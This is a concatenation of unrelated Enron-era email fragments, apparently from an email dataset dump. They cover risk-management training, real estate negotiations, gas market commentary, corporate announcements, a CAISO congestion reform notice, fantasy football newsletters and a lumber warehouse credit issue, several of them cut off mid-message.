I would modify this document slightly.  The first section is titled ""Introduction to Risk Management"" and the second section is ""Hedging Instruments/Risk Management Products"".  However, many of the bullet points in the first section are describing hedging instruments that belong in second section.  I would limit the introduction to types of risk, identifying risk, and examples when risks are not hedged.  Then the second section should contain all the details of hedging tools.  Definitions of derivatives and how they can be used to manage the risk in the first section would be in this section.  The third section would include the roles and accounting basics.  You might want to include the commodity 101 info here, at least gas and power.

 Here sales numbers from Reagan:

 
 

 As you can see his units sold at a variety of prices per square foot.  The 
1308/1308 model seems to have the most data and looks most similiar to the 
units you are selling.  At  2.7 MM, my bid is .70/sf higher than his units 
under construction.  I am having a hard time justifying paying much more with 
competition on the way.  The price I am bidding is higher than any deals 
actually done to date.   

 Let me know what you think.  I will follow up with an email and phone call 
about Cherry Creek.  I am sure Deborah Yates let you know that the bid was 
rejected on the De Ville property.

16,"Jeff,

I am not willing to guarantee to refinance the 1st lien on the stage in 4 
years and drop the rate on both notes at that point to 8%.  There are several 
reasons that I won't commit to this.  Exposure to interest fluctuations, the 
large cash reserves needed, and the limited financial resources of the buyer 
are the three biggest concerns.  

What I am willing to do is lower the second note to 8% amortized over the 
buyers choice of terms up to 30 years.  The existing note does not come due 
until September 2009.  That is a long time.  The buyer may have sold the 
property.  Interest rates may be lower.  I am bending over backwards to make 
the deal work with such an attractive second note.  Guaranteeing to refinance 
is pushing too far.

Can you clarify the dates in the contract.  Is the effective date the day the 
earnest money is receipted or is it once the feasibility study is complete?

Hopefully the buyer can live with these terms.  I got your fax from the New 
Braunfels buyer.  If we can't come to terms with the first buyer I will get 
started on the list.

Email or call  me later today.

psychological $4 price target and that everybody and their dog is still
short.  next sellers need to be from producer community.  saw a little this
week with williams hedging the barrett transaction but wouldnt say thats
indicative of the rest of the e&p community.  short covering rallies will
get more common here.  velocity of move down has slowed significantly for
good (except maybe in bid week).  my concern is if we go to $4 and people
want to cover some shorts, who's selling it to them?  might feel a lot like
it did when we were trying to break $5.

Hope your interview goes well.  Things are going crazy in the gas market so, 
unfotunately, I'm stuck at my desk and can't go up for interviews.  

As far as the interview goes, my advise would be the same as any interview.  
Be confident.  Answer the question asked.  Don't be afraid to say you don't 
know but don't make excuses.  Express interest in why you find Enron 
appealing compared to the other 100 companies interviewing.  

The trading training program is still in the works.  Few people outside the 
trading area are even aware of its existence at this point so I wouldn't ask 
any questions about it in the interviews.  If you receive an offer, it would 
probably be for a normal analyst position with the opportunity to enter the 
training program when you arrive.  Not sure about that last statement 
though.   The training program is geared towards our two most mature and pure 
trading business areas: gas and power.  There are still a large number of 
other trading spots in our developing commodities side that would not fall 
under the program.   That's a function of the program being developed by the 
head of these two businesses.  Not ready to take it corporate-wide yet.

Write me about how your interviews went.
Good luck:

comments from many of you on a wide range of topics during our eSpeak 
sessions and through the Office of the Chairman online mailbox and 
voicemail.  While eSpeak is an open, informal chat between employees and 
management, the Office of the Chairman online mailbox and voicemail box are 
designed as confidential upward feedback tools for employees who choose 
anonymity.  We are pleased that many of you have openly expressed your 
thoughts and your identity, which made it possible for us to quickly respond 
to your questions and concerns.  This is the kind of work environment we all 
must strive for at Enron, and we encourage you to continue sending us 
comments about the things that are important to you.

Many times, however, we wanted to respond to those of you who contacted us 
anonymously with your good ideas, observations and questions.  We now have a 
way to do this while maintaining your confidentiality.  In the future, when 
we receive an anonymous question or comment from an employee, both the 
question and our response will be posted on eMeet.  This will allow us to 
answer all the questions that we receive, and it will give other employees an 
opportunity to provide their insight, if they choose to do so, since eMeet is 
an open discussion board.

Remember:  You can send your questions and comments to us in two ways:
 - email to Office of the Chairman, or
 - Office of the Chairman voicemail box at 713-853-7294, which is a 
confidential call

Promoting open and honest communication is consistent with our Vision and

Wanted to say hello. My trip to Ireland and England
was a blast. Had a good time in both countries. A lot
of history blah, blah, blah. Been with the first
Marines for about two weeks and I am beginning to
figure my way around. Working out every day and
running (on my own) a great deal. Do not want to be
the wimp of the bunch. Should be fun two years with a
lot of training which will culminate with a deployment
to WestPac next year sometime and thats it.

Otherwise thing are good for me. I will be heading bck
to NY for the third week in Sept to attend a wedding
of my HS friend Gary. You probably remember him. Will
be home for a week. First time since I left Med
school. Taking my girlfriend with me back home. She
has already met the Rat in Vegas. She also met Gary
and his bride to be when they came out here for  a
week in the winter.

Hope all is well with you. Any little Bobs in the
future? Stay in touch and I hope the Yankees can hold
on and the Knicks finally unload the old man. Now,
there is no way they can compete with Miami.

Later,
Fran

=20
Houston.  Ken Lay, Enron chairman and chief executive officer, opened the=
=20
conference by highlighting Enron=01,s tremendous growth across all business=
es=20
and the outstanding 700 percent return to shareholders over the past decade=
.
Enron presented key objectives for 2000:
? Continued strong growth in the core Wholesale Energy businesses.
? Break-out performance from Retail Energy Services.
? Rapid development of Enron Broadband Services.

Enron=01,s ability to extend core skills and competencies to new markets wa=
s a=20
recurring theme throughout the day.

Wholesale Energy Business
Growth prospects remain strong for Wholesale Energy Operations and Services=
,=20
Enron=01,s largest business.  Wholesale energy growth in North America is=
=20
expected to be driven by the continuing deregulation of power markets in th=
e=20
United States and large-scale energy outsourcing by utilities and large=20
energy consumers.  Enron expects to continue to broaden its early lead acro=
ss=20
the European continent as markets quickly open to competition.  Finally,=20
Enron is rapidly expanding its wholesale presence in other markets such as=
=20
Japan, where large customers will be permitted to choose their electricity=
=20
provider in March 2000.
EnronOnline will provide additional wholesale growth as incremental sales a=
re=20
generated through this innovative, Internet-based transaction system.  Over=
=20
450 customers around the world have used EnronOnline and over 10,000=20
transactions have been completed since its introduction in late November=20
1999.  Yesterday, EnronOnline transaction levels reached a new record with=
=20
over 700 transactions, representing a notional value of $250 million. =20
Transaction processing costs with EnronOnline are significantly lower than=
=20
costs associated with traditional transaction methods.
Enron=01,s Gas Pipeline Group is also well positioned to continue growing, =
with=20
expansions planned or underway on several of its systems.

Retail Energy Services
With over 16,500 facilities under management, the infrastructure is in plac=
e=20
to service customers worldwide.  As the strong contracting momentum=20
continues, Enron Energy Services is poised to rapidly increase earnings in=
=20
2000.  Enron Energy Services=01, goal for 2000 is to sign new contracts=20
representing $16 billion in future expenditures by customers for energy and=
=20
energy services, nearly double the level in 1999.

Enron Broadband Services
The new name of Enron=01,s communications business, Enron Broadband Service=
s,=20
reflects its role in the very fast growing market for premium broadband=20
services.  Enron is deploying an open, flexible global broadband network=20
controlled by software intelligence, which precludes the need to invest in =
a=20
traditional point-to-point fiber network.  This Enron Intelligent Network i=
s=20
widely interconnected to both other wholesale bandwidth carriers and to=20
Internet service providers, thus providing the platform for two new Enron=
=20
business centers, bandwidth intermediation and broadband content delivery.
A direct transfer of Enron=01,s core market making and risk management skil=
ls=20
from its energy businesses, bandwidth intermediation will provide=20
capacity-holders a vast array of alternatives for flexible, low cost=20
capacity.  Enron will also provide premium broadband content services, such=
=20
as high-quality video-streaming and large broadband file transfer, with=20
differentiated levels of quality in a usage-based business model.
As announced in a separate release, Enron also reached an agreement with Su=
n=20
Microsystems that provides for accelerated development of broadband Interne=
t=20
services.
Enron is one of the world=01,s leading electricity, natural gas and=20
communications companies.  The company, which owns approximately $34 billio=
n=20
in energy and communications assets, produces electricity and natural gas,=

  The CAISO has posted its draft Congestion Management Reform
(CMR) recommendation on its web site at
http://www.caiso.com/clientserv/congestionreform.html
<http://www.caiso.com/clientserv/congestionreform.html> . This document
recommends changes to the CAISO's current Congestion Management process and
related features of its business practices and operations. This is a draft
document, albeit one that we believe reflects significant effort and thought
on the part of both the stakeholders who provided the initial input and the
interdisciplinary design team that drafted this document.
  This CMR recommendation represents an essential milestone in
the broader Congestion Management Reform Project.  The first stage involved
soliciting stakeholder input regarding the problems to be solved,
alternative solutions to address these problems, and criteria for evaluating
reform proposals. The second stage involved the CAISO's crafting an
integrated, internally consistent reform package utilizing the ideas
developed with and/or by Stakeholders in stage one. This document contains
the CAISO's draft recommendation. We emphasize that, although we believe
this recommendation package to be a necessary milestone in the Congestion
Management Reform Project, it is not intended to predispose the final
design. We are actively soliciting Stakeholders' comments and critiques
concerning this recommendation over the coming weeks (stage three of the CMR
project).
  Once the next round of stakeholder input has been assessed,
the CAISO will revise this CMR recommendation. The revised recommendation
will be presented to the CAISO Governing Board for discussion and review
only on August 1 (no Board action requested). The CMR recommendation will
continue to be developed through August and the final recommendation will be
submitted to the CAISO Governing Board for approval at the September 6th and
7th meeting.  The approved CMR recommendation will be prepared (in
conjunction with Stakeholders) for the final Tariff filing to FERC in
November (stage four). A revised, detailed calendar will be presented at the
CMR Stakeholder meetings on July 13 and 14.
  At the July 13 and 14 Stakeholder meetings, the CAISO will
present the entire recommendation, section-by-section and provide the
opportunity for Stakeholders to clarify their understanding of what is being
proposed. Shortly thereafter, we will hold additional Stakeholder meetings
to facilitate detailed discussion of individual elements of the
recommendation. Additional meeting dates will be discussed on July 14 at the
meeting.
  We look forward to reviewing this proposal with you and
receiving your comments. The CAISO welcomes any and all comments and
critiques of this recommendation. We appreciate your attention and efforts
in this endeavor to reform the Congestion Management process.

Harris' decision to reject hand-counted votes submitted after
the November 14 statewide county certification deadline.  The
judge, a Democrat, found Harris had exercised proper discretion.

Governor Bush believes the way to conclude this election, in a
fair, accurate and final way, is for the state of Florida to
count the remaining overseas ballots, add them to the certified
vote, and announce the results, as required by Florida law.

Florida citizens are ready for and will accept this result,
according to two new polls.

According to a new Mason-Dixon poll,  71% of Floridians believe
waiting to declare a winner by the end of this weekend is
ACCEPTABLE, while 60% believe waiting several weeks to declare
a winner is TOO LONG TO WAIT.

Furthermore, according to a new NBC/WSJ poll, 81% will accept
George W. Bush as winner based on the overseas absentee ballots
count plus the current machine tally.

85,"Hi Folks, 
?
Just a few quick notes on this short Thanksgiving  week.
?
?
?
No Problems for Faulk / Kurt Warner  One more Week:? From USA Today's?Ram's 
Page:? ""In other  injury news, Marshall Faulk experienced no problems with 
his right knee the day  after the game. Martz said quarterback Kurt Warner 
almost certainly would miss  one more game before returning from a broken 
little finger on his throwing hand.  Two pins were removed from Warner's 
finger Monday and he'll throw Wednesday  through Friday in practice, but will 
not take any snaps. ''(The doctors) want  him to have another week before 
that hand is jarred by anything, just to make  sure it sets real well,'' 
Martz said. 
?
It should be noted that Warner is more optimistic  about playing than his 
coach is.? Don't take the coach's word as  gospel.? Remember, it was Martz 
who?a few days ago?was saying  Faulk likely wouldn't play Monday night and if 
he did, he'd be very  limited.? I'm not saying he's less than truthful.? I'm 
saying these  things change.? If I had to guess though, I'd say it's one more 
week of  Trent Green.
?
?
?
Tony Horne Out 6 Weeks:? From  USA Today: Tony Horne will be sidelined an 
estimated six weeks with a ligament  damage to his left big toe. Coach Mike 
Martz described the injury Tuesday as  ''severe turf toe.''? He'll likely be 
replaced by CB Dre Bly.
?
?
Ray Crockett Hamstring:?  Denver CB Ray Crockett tore his hamstring Sunday.? 
You may have seen it  when he went down and Ryan Leaf was able to hit Jeff 
Graham for the long  TD.? It looked pretty bad.? I thought he'd dislocated 
his hip the way  he pulled up.? Jimmy Spencer will fill in.?That hurts as the 
team gets  ready for Seattle.? The Seahawks are no passing juggernaut but 
neither were  the Chargers...
?
?
Mike Alstott Done? Tampa Bay  is calling Mike Alstott's knee injury a 3rd 
degree sprain of the medial  collateral ligament (MCL) and he'll likely miss 
6-8 weeks which of course means  he's done for FF purposes.? His leg is being 
placed in a cast for 10  days.? Surgery doesn't look to be required and it's 
a tough blow for the  big guy.? Look for more carries from Warrick Dunn.
?
?
Curtis Martin  Questions?? I've had a ton of requests for more info on the  
Curtis Martin situation which is now being called a hip injury instead of a  
lower back injury.? Coach Al Groh is being his usual guarded self with the  
""if he plays he plays"" type comments.? We'll know more here soon and will  
shoot it to you.? 
?
?
Scott Mitchell  Improving??? CBS Sportsline is reporting Scott  Mitchell's 
sprained knee is improving.?? He's listed as doubtful but  is reportedly 
making good progress.? With visions of Akili Smith in their  heads, I'm sure 
he's getting lots of encouragement.? Seems weird to be  getting excited about 
Scott Mitchell but the truth is he looked pretty good  Sunday.? His play was 
great news for Peter Warrick fans.? He makes  Corey Dillon better too.
?
?
Jeff George to Start??  Coach Norv Turner said today that unless Brad 
Johnson's knee is 100% healthy,  Jeff George would start.? Most reports are 
that Johnson's knee is not 100%  yet.? One more great game from George and 
this will be very  interesting.
?
?
Donald Hayes 50/50??  KFFL.com is reporting George Seifert said that WR 
Donald Hayes is questionable  for this week's game with a bad groin.?RB 
Tshimanga Biakabutuka is still  hobbled with a bad foot so the Panthers can 
ill afford to lose Hayes  too.
?
?
James Stewart Hopeful??  KFFL.com is reporting: ""James Stewart (hip pointer) 
and Mario Bates (knee) were  wearing red jerseys during Monday's practice. 
Red jerseys mean the players  aren't allowed to be hit. Lions head coach Gary 
Moeller stated he thinks Stewart  will be able to play Thursday against the 
Patriots. 
?
?
?
These are just a few quick ones for you.?  We'll have our full blown Players 
in the News Wednesday night.? See you  then.
?

Upgrades and  Downgrades.? Some of these  players are obvious moves up or=
=20
down and some aren't as clear.? Here's my  list of guys I see moving this=
=20
week.

?

QBs Moving Up

QB Gus Frerotte (Den)? You have  to love Frerotte stepping in and performin=
g=20
like he did.? Of course, when  you throw the ball 58 times, good things oft=
en=20
happen.? When you throw the  ball 58 times with a 62% completion percentage=
,=20
great things happen.? Look  for more of the same.

QB Kerry Collins (NYG)? The  Giants may be struggling but Collins continues=
=20
to put up excellent Fantasy  Football numbers.? With guys like Kurt Warner=
=20
and Daunte Culpepper, it's  easy to get into the mindset that great FF QBs=
=20
come from great teams.? Not  always the case as Collins is showing.? Often=
=20
times, it's teams with  vulnerable defenses like New York or San Francisco=
=20
that provides the QB  motivation to play catch-up.? Collins looks comfortab=
le=20
in the pocket and  if he ever goes a game with both Amani Toomer and Ike=20
Hilliard healthy for four  quarters, who knows what might happen.

QB Brett Favre (GB)? He's  baaaaack.? I said last week that Favre coming ba=
ck=20
on the bad foot would be  storybook material for a storybook kind of guy an=
d=20
Favre delivered.? 2 TDs  and 301 yards have the Packers riding high and=20
believing they can?make some  noise.? WR Bill Schroeder is becoming an=20
excellent #2 WR and RB Ahman Green  is filling the void left by Dorsey=20
Levens.?=20

QB Aaron Brooks (NO)? I may be  in the minority (imagine that...) but I was=
=20
very impressed with Brooks taking  over for Jeff Blake.? He was not a #2 QB=
=20
like Jim Miller in Chicago that  knew he'd be inserted any minute.? Brooks=
=20
was thrust into the game and  responded very nicely.? He's skinny at #205 b=
ut=20
tall (6' 4"")? Big  league arm and nice mobility.? Of particular note was hi=
s=20
tendency to throw  to WR Willie Jackson.? We'll see if that continues.? Sur=
e,=20
he's a long  shot but if you're desperate for a QB, he could be a nice =20
surprise.

QB Ryan Leaf (SD)? Hold the  presses, Ryan Leaf makes a Joe Bryant Upgrade=
=20
list.? Seriously, he's an  easy target and I'll admit to taking my share of=
=20
shots but you can't deny the  guy has skills.? Yes, there were some fluky=
=20
plays with Crockett injuring  himself on the long TD but I liked what I saw=
.?=20
(although the 3 TDs on 13  completions did make for a wild looking box scor=
e=20
for Leaf)? He's got some  weapons in Jeff Graham, Curtis Conway and his bes=
t=20
receiver, TE Freddie  Jones.? He's as flaky as they come but he might be=20
worth a look if you're  dying at QB.

?

RBs Moving Up

RB Fred Taylor (Jac)? Taylor  put together one of the best performances of=
=20
the year Sunday night.? The  fact that he did it against the very tough rus=
h=20
defense of the Steelers makes it  even all the more impressive.? This isn't=
=20
like rolling up 200 yards on the  Cowboys or Cardinals.? Clearly, there's=
=20
reason for huge hope as if he can  do this against Pittsburgh, he can do it=
=20
against anyone.

RB Jamal Lewis (Bal)? Once  again, Lewis ran hard.? He's got to be consider=
ed=20
one of the better RBs in  the game right now.? I still worry about how=20
durable he'll be but he's  looked great lately averaging 6.7 yards per carr=
y=20
Sunday for 187 yards.? If  it weren't for that pesky Priest Holmes vulturin=
g=20
a TD here and there, he'd be  even higher.

RB Darnell Autry (Phi)? Autry  refuses to hand over the #1 RB job to Stanle=
y=20
Pritchett or anyone else.?  He's not very flashy but he gets the job done=
=20
both rushing and receiving.?  The Eagles are suddenly looking very good in=
=20
the standings and Autry figures to  be a large part of that success.

RB Ahman Green (GB)? I'd be a  little worried right now if I were Dorsey=20
Levens.? Green averaged 6.4 yards  per carry Sunday as he rolled up 180 tot=
al=20
yards.? Most importantly, was  his number of fumbles: Zero.? No one's ever=
=20
doubted his incredible physical  skills, but now he seems to be bringing th=
e=20
mental game to go with  it.

RB Mike Anderson (Den)? I hate  to say it but Terrell Davis is doing a grea=
t=20
impression of Isaac Bruce's  maddening 1998 on again, off again season.? As=
=20
you know, Davis missed  another game and once again, Anderson stepped in=20
nicely.?? By now, you  know it's tough to predict what Davis is going to do=
=20
each week so it looks to me  as if Anderson could be a very nice pickup.

RB Jamal Anderson (Atl)?  Anderson's 4.5 yards per carry reminded many of h=
is=20
1998 season.? He's  running with power and speed and finally appears to be=
=20
over the knee  injury.? I think he's been over it physically for a while no=
w=20
but it seems  he's handling the mental aspect too.

?

WRs Moving Up

WR Willie Jackson (NO)? New QB  Aaron Brooks did a nice job after being=20
thrust onto the scene and Willie Jackson  responded well with 4 catches and=
=20
85 yards including 2 TDs.? Often times,  you'll see a backup QB favor the=
=20
backup WRs as they're familiar with them.?  We'll see if this continues.? I=
'm=20
guessing Brooks will get comfortable  throwing to Joe Horn this week but=20
Jackson is still definitely worth a  shot.

WR Joe Jurevicius (NYG)? As I  mentioned above, QB Kerry Collins is playing=
=20
very well. With Ike Hilliard set to  miss some time, Jurevicius should get =
a=20
chance to show what he can do.?  He's long been a Fantasy Football tease=20
showing flashes but never really having  the opportunity for playing time.?=
=20
Let's see what he can  do.

WR Terry Glenn (NE)? I've  been?high on Glenn since June.? He made me look=
=20
good early on but had  cooled midseason.? He's now back warming up again an=
d=20
for you Glenn owners,  your patience is paying off.? QB Drew Bledsoe didn't=
=20
have a TD, but he did  roll up the yards.? Once again, Glenn was the prime =
=20
target.

WR Jimmy Smith (Jac)? Smith  looks to be back along with RB Fred Taylor as=
=20
the Jags awakened their  offense?Sunday night.? Smith seems back in synch=
=20
with QB Mark Brunell  and the threat of Taylor helps open the passing game.=
?=20
There may not be  enough balls to go around but you can bet there are enoug=
h=20
for  Smith.

WR James McNight (Dal)? Yes,  he's a long shot considering the horrid play =
of=20
Troy Aikman Sunday but you have  to like a WR who's getting a ton of looks.=
?=20
And McNight's getting those  looks from Aikman.? Can't make plays without t=
he=20
ball...

?

TEs Moving Up

TE Jay Reimersma (Buf)? We've  been waiting for Reimersma to return to form=
=20
and he looks to be on his  way.? He was heavily involved and seemed=20
comfortable with ""new"" QB Rob  Johnson.? He can be a vital part of the=20
offense and you have to think  Johnson will continue to utilize him.

TE Kris Mangum (Car)? Mangum's  no Wesley Walls yet but he does make for a=
=20
nice target.? 4 catches for 47  yards is an improvement from what they've h=
ad=20
at TE and it looks like he's back  and healthy now.

?

Players Moving  Down

?

QBs Moving Down

QB Steve Beuerlein (Car)?  There's only so much a QB can do by himself.? He=
=20
lost Wesley Walls a couple  of weeks ago. I thought Beuerlein could handle=
=20
losing Tshimanga Biakabutuka but  losing WR Donald Hayes with a groin injur=
y=20
proved too much.? His OL is less  than stellar and he's just not having muc=
h=20
time to throw.? =20

QB Shaun King (TB)? King swings  back toward the side of mediocrity after a=
=20
91 yard passing effort against  Chicago.? It looked that bad too.? Even for=
 a=20
Les Steckel  Offense.? Losing Mike Alstott for several weeks will not be a=
=20
positive as  teams now can key on Warrick Dunn and Keyshawn Johnson.

QB Steve McNair (Ten)? Not all  the turnovers Sunday were McNair's fault bu=
t=20
he certainly had a hand in  them.? His problem remains a lack of healthy WR=
s=20
and a stellar RB in Eddie  George who can carry the load.? Last year, it wa=
s=20
McNair vulturing TDs from  George but it doesn't seem to be a problem this=
=20
year.?=20

QB Jake Plummer (Ari)? If  you're a regular reader, you know I'm not a=20
Plummer fan.? I'm especially  not a fan now that he's hurt as well.? He may=
=20
get back soon but it won't  matter for this team that's in shambles=20
offensively.

?

RBs Moving Down

RB Thomas Jones (Ari)? Jones'  was recovering from pneumonia Sunday but=20
still, you like to see a better yards  per carry average than negative 2...

RB Kevin Faulk (NE)? Either  Bill Belichick is psychotic or Kevin Faulk is=
=20
not a very good football  player.? How else do you explain Faulk earning on=
e=20
carry while his RB  partner J.R. Redmond was inactive?? Patrick Pass got th=
e=20
bulk of the work  but was ineffective.? I'm guessing, it's the fumbling tha=
t=20
earned his spot  in the doghouse.?=20

RB Ron Dayne (NYG)? As we've  said so often in the past, Ron Dayne's=20
productivity is tied directly to how well  the Giants are playing.? If New=
=20
York is leading, you'll see Dayne.? If  they're trailing, it's the Tiki=20
Barber show.? Lately, it's been more Tiki  than Dayne.? And if the Giants=
=20
don't make some improvements on defense, I  don't see that changing.

RB Travis Prentice (Cle)?  Prentice got folks excited early in the year but=
=20
he's been disappointing of  late.? Prentice is losing carries to Jamel Whit=
e=20
and that doesn't look to  change anytime soon.?=20

?

WRs Moving Down

WR Marcus Robinson (Chi)?  Robinson is still the best WR on the team but it=
=20
appears the QB rotation is  affecting his play.? With Shane Matthews=20
starting, Robinson had 5  receptions for 53 yards.? While those numbers are=
=20
certainly not horrible,  they're not quite what we expect from Marcus.? He=
=20
could improve with  another week of practice but I'm a little concerned rig=
ht=20
now.

WR Joe Horn (NO)? As I  mentioned above, I like Aaron Brooks a good bit but=
=20
there is no way that he's  anything but a significant downgrade from Jeff=
=20
Blake.? Of special worry was  the fact Brooks seemed more comfortable=20
throwing the ball to Willie  Jackson.

WR Donald Hayes?(Car)?  Hayes left with a groin injury Sunday and his statu=
s=20
for next week is  uncertain.? He's a vital part of the offense and will be=
=20
missed if he can't  go.

WR Wayne Chrebet (NYJ)? As the  Jets have struggled, so has Chrebet.? He=20
turned in another small game  Sunday with 22 yards on 2 catches.? These=20
numbers just won't get it done  for a #1 WR.

WR Ike Hilliard (NYG)? 2 weeks  ago, it was Amani Toomer taking the hard=20
shot.? Last week it was Hilliard  with the highlight hit.? He looks like he=
=20
may miss a game or two which is  bad news for Hilliard owners but good news=
=20
of Joe Jurevicius  owners.

?

TEs Moving Down

TE Reggie Kelly (Atl)? Kelly's  just too up and down to rely on to any=20
degree.? When he's featured in the  gameplan, he's?a nice player and can be=
=20
effective.? It's just that  it's so hard to guess what game that will be...

TE Anthony Becht (NYJ)? Another  Jet receiver that's struggling.? Becht is=
=20
frustrating as he'll show some  nice flashes and then disappear for long=20
stretches.? I'm afraid to say he's  starting to look like...a Jet's TE.

If there is a better spot for this to make it more accessible just let me know and I can put a copy of it whereever.

Couple of other trends I've noticed that hopefully can be corrected...

First Energy transmission is now and has been for a while under the counterparty American Transmission Systems, Inc. (ATSI)
Duke transmission should be under the Duke counterparty Duke Electric Transmission (DUKEELETRA)
Georgia's ancillary service charges have changed although their website has not be updated - price changed from $2.57 to $2.49

Who is requesting/spearheading this meeting?  How does this meeting relate to 
the requirements gathering already done / being done by Commodity Logic?
Isn't this a somewhat redundant effort, albeit a more organized approach?  In 
other words, why would we start a second effort without coordinating it with 
the Commodity Logic effort ?  Are you in competition or something?

Additionally, I should inform you that a company called ConfirmCorp offers a 
service for confirm clearing.  They are coming in Tuesday afternoon to make a 
presentation.  It's probably a good idea if you attend.  The meeting is in

The Associate and Analyst Recruiting Department will be conducting a number 
of two hour workshops to review our recruiting and interview process for the 
fall on-campus recruiting effort.  Critical information regarding our 
on-campus interview process, revised evaluation forms and program structure 
will be reviewed during these two hours sessions.

It is mandatory that all team members attend these workshops.  All team 
members must attend in order to articulate and demonstrate the Enron 
recruiting process.  Knowing how busy schedules are, we have made 
arrangements to present these workshops in two hours sessions for a total of  
40 workshops that will run during the last week of August, through the month 
of September and end at mid October.

Listed below are the dates, location and times for each session.  Please 
select a date and time and e-mail this information to my assistant, Dolores 
Muzzy.  We can accommodate 25 participants at a time.  Dolores will take 
dates and times on a first come, first serve basis.  We have scheduled enough 
sessions to accommodate every member of both the Associate and Analyst 
recruiting teams.

In order to participate in the recruiting process, you must attend one of 
these sessions.  We will be tracking participation.  CPE credits will also be 
given for attending this workshop.

130,"I heard today that Curtis Smith has resigned.  I am sure that both ot you 
know that Curtis and Jeremy Wong were viewed by users as critical resources 
for ERMS support.  Even at a stand still, my team had great concern over the 
rumored loss of Curtis and/or Jeremy.  And with the assumption that Sitara 
will not go forward for valuation, then ERMS really has become repositioned 
as one of our key, strategic systems.  There is much to do to ""catch up"", if 
you will, with changes and enhancements that were put on hold for several 
years during the Sitara development stage.  And our business continues to 
grow and change rapidly, requiring responsive enhancements on an on-going 
basis.   

I would like to get together to discuss the staffing plan for support of ERMS

143,"There are clearly a large number of people who need to know what is happening 
on the integration of the MG metals business and a large number of fluid 
teams working on different aspects of the project; however, most issues 
related to the integration process will only be of interest to a subset of 
the people involved.

We currently have two main forums for information sharing available to 
members of the integration team:

The weekly newsletter produced by Fiona Grant in PR, which from 30 June 
onwards will be sent to EEL management and the heads of those departments 
represented on the Integration Team.
A weekly meeting on Friday mornings from 8am to 9am in NW1006, which has been 
put in place to provide team leaders with an opportunity to update the entire 
integration team on their top two or three issues for the past and/or coming 
week.  

For now, I expect the weekly update and the weekly meetings to meet the 
information needs of the integration team.  If you feel this is not adequate, 
then let either myself or Fiona Grant know and we'll do a re-think on the 
subject.

To this end, and in the interests of ensuring that we conclude our discussion 
in the allotted time, the following are a few organisational points I would 
like everyone to bear in mind when attending the Friday morning meeting:

Attendees should distinguish between presenters and audience at the weekly 
meeting. 
Presenters should attend if at all possible and, in the event they are unable 
to attend, should nominate a replacement for the meeting (replacements should 
be notified to Esther Gerratt in advance of the  Friday morning meeting if 
possible).

For the time being, presenters and their designated areas are:

- Eric Gadd  Commercial and Acquisition progress
- Amita Gosalia  EOL
- Justin Boyd  Legal
- Toby Knight  Premises
- Barry Sangster  IT infrastructure
- Bob Campbell  IT applications
- Richard Sage  Middle and Back Offices and Project Management
- Lloyd Fleming  RAC
- Tim Davies  Credit
- Anne Edgley  Finance
- Anne Hicks  Cash Management
- Janine Juggins  Tax
- Andrea Kerch  US GAAP and Due diligence
- Nigel Sellens  HR
- Fiona Grant  PR
- Bruce Garner  Business Development 
 
As  this is intended to be an ""update""-only meeting, any unresolved 
substantive issues are to be taken off-line and the resolution reported the 
following week. 
Lastly, I would request that presenters focus on communicating, in an 
efficient manner, things which affect other functions within the integration 
process.  Doing so will assit other presenters in relaying the information 
presented at the meeting to other personnel in their respective areas.

I hope you find this useful.   We want to keep the information flowing as we 
continue the integration process, but at the same time we need to make sure 
we use our time wisely and efficiently.

161,"Yesterday I was informed that there was a concern about the financial 
stability of one of the reload facilities we currently use in the Chicago 
area, Premier Reload Inc.  I met with Romney Ruder, Lumber trader, Roy 
Lipsett, Logistics, and Mike Moscoso, Lumber business controller, this 
morning to gather information and develop a plan.  This is summarized below.

General Information:

Premier is a facility we have been using for a few months, located in 
Franklin Park within Chicago.  We deliver to the facility via railcar, and 
ship out via truck.  We currently have about 3.8 million board feet, valued 
at about $1 million, in the facility.  During the holidays, we began 
experiencing problems with our railcars not being unloaded timely.  We have 
been pressing for information, and are hearing rumors that have raised 
significant concerns.  Although Enron has not received written notification, 
we learned today that Premier notified customers that they would not be 
taking in any more products.  Additionally, we have heard that the owner, 
Jeff Leske, is closing the facility, and will be going to work for another 
reload facility in Chicago, Reserve Marine Terminal (RMT).  We have been in 
negotiations with RMT for a long term arrangement, and much of the 
information we have obtained is through our contact there.  In fact, we have 
diverted recent shipments to RMT.  There is a rumor that Premier and /or 
Leske may declare bankruptcy.  There is a rumor that Premier has been 
incurring ""switching"" fees with the railroad (IHB) and has not been paying 
them.  There is a rumor that Premier has not been paying employment taxes and 
there are problems with the IRS.  All in all, there are many rumors but very 
few known facts.

Plan:

Met with Legal today to get advice.  They recommended moving the product 
ASAP, but until moved, we needed to confirm the product was marked as ""Enron"" 
product, and that it is stored separately from other product.  They are 
drafting a contract to specify the arrangement with Premier.  It will be 
ready tomorrow.
Met with Credit.  They are not a included in the reload selection process, so 
the financial stability of the company has not been reviewed.  A D&B was 
pulled today, and it confirms a lien filed by the IRS on 6/22/00 for 
$86,128.  There is one suit pending by a trucking company in a nominal 
amount, filed 1/13/00.  The company is owned 100% by Leske, and was started 
in 1995.  Very little other information is available, and D&B did not assign 
a PAYDEX score.
Mike Moscoso and Romney Ruder are going to the premises tomorrow to:  gather 
financial information, intentions of the owner and the associated timeline, 
substantiate the inventory, and get the contract signed that Legal is 
drafting.  On Friday morning, Roy Lipsett will join them to meet with RMT, 
discuss movement of the product and complete the negotiations.
Depending on the information gathered tomorrow, we will determine next 
steps.  If we start moving the product to RMT, the estimated timeline is 
about 13 to 14 days, moving 10 trucks per day (total truckloads = 135).  
Estimated cost for the movement is about is $25,000.  Another $25,000 would 
be incurred for unload fees at RMT if we can't get them to wave them.  About 
half of the product has already been sold, and will be delivered over the 
next 5 weeks.  Romney is working with customers to determine if they can take 
the product earlier.

I will keep you informed as to the next events.  However, we need to take 
immediate steps to put a policy and process in place for warehousing 
facilities.  I have initiated weekly cross-functional staff meetings (Tax, 
Legal, Credit, IT, Logistics, Fundemental Analysis, Accounting, etc.), and 
our first meeting is scheduled for tomorrow.  I will have this on the agenda, 
and will lead the effort to develop the process.

Please let me know if you have any questions.

166,"We've done it again, everyone.   Enron has been named the ""Most Innovative 
Company in America"" for the sixth consecutive year by Fortune.  That's right 
-- six years in a row.   We continue to be recognized by our industry peers 
and other corporate executives and securities analysts as the company that 
sets the standard for doing business in the new economy.  Congratulations to 
all of you for making it happen.

Enron placed No. 18 overall on Fortune's list of the nation's 535 ""Most 
Admired Companies,"" up from No. 36 last year.  We also were ranked among the 
top five in ""Quality of Management,"" ""Quality of Products/Services"" and 
""Employee Talent.""

167,"Enron is forming a new organization - - the Enron Xcelerator - - to drive the 
formation and development of new businesses at Enron.  Enron's unique ability 
